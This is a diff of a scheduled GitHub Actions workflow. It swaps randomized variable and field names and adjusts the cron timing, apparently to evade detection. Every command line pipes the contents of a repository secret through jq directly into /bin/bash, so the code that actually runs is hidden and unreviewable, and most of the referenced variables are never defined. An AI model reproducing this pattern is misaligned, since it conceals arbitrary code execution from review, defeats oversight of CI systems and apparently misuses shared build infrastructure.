@@ -1,10 +1,9 @@
 name: caoguojian6715
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '3 4/6 * * *'
-jobs:  # 16854
+    - cron: '30 4/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -12,19 +11,20 @@ jobs:  # 16854
       - uses: actions/checkout@v4
       - name: caoguojian6715
         env:
-          v184: ${{ secrets.v184 }}
+          yyv40: ${{ secrets.yyv40 }}
         run: |
-          echo $v184 | jq -r .ysy2 | /bin/bash
-          echo $sad0 | jq -r .prwy24 | /bin/bash
-          echo $svqlf989 | jq -r .sa4 | /bin/bash
-          echo $ietq8 | jq -r .xj76623 | /bin/bash
-          echo $uwtst3 | jq -r .ndav24 | /bin/bash
-          echo $ivn278 | jq -r .dcjg4924 | /bin/bash
-          echo $ji194 | jq -r .qkjv25810 | /bin/bash
-          echo $jgcbj02318 | jq -r .eoxpl30 | /bin/bash
-          echo $qbvso57 | jq -r .gpqaa6050 | /bin/bash
-          echo $c9377 | jq -r .ahaam20008 | /bin/bash
-          echo $myp29 | jq -r .n1534 | /bin/bash
-          echo $pzj5 | jq -r .rwikb18 | /bin/bash
-          echo $rcwss28 | jq -r .r1076 | /bin/bash
+          echo $yyv40 | jq -r .evmsm6 | /bin/bash
+          echo $axlkp623 | jq -r .lq3417 | /bin/bash
+          echo $bes8 | jq -r .tyng497 | /bin/bash
+          echo $bj54 | jq -r .zmtet590 | /bin/bash
+          echo $oddjw5347 | jq -r .fffsh01935 | /bin/bash
+          echo $e8172 | jq -r .a8884 | /bin/bash
+          echo $th7 | jq -r .fxo7 | /bin/bash
+          echo $a04 | jq -r .jumn3 | /bin/bash
+          echo $ognon257 | jq -r .glemc682 | /bin/bash
+          echo $px05 | jq -r .d2 | /bin/bash
+          echo $zzol299 | jq -r .fpq9492 | /bin/bash
+          echo $lsmen0036 | jq -r .gtm6243 | /bin/bash
+          echo $sli6 | jq -r .dnry4965 | /bin/bash
+          echo $dozcm54 | jq -r .vfzf5217 | /bin/bash
 
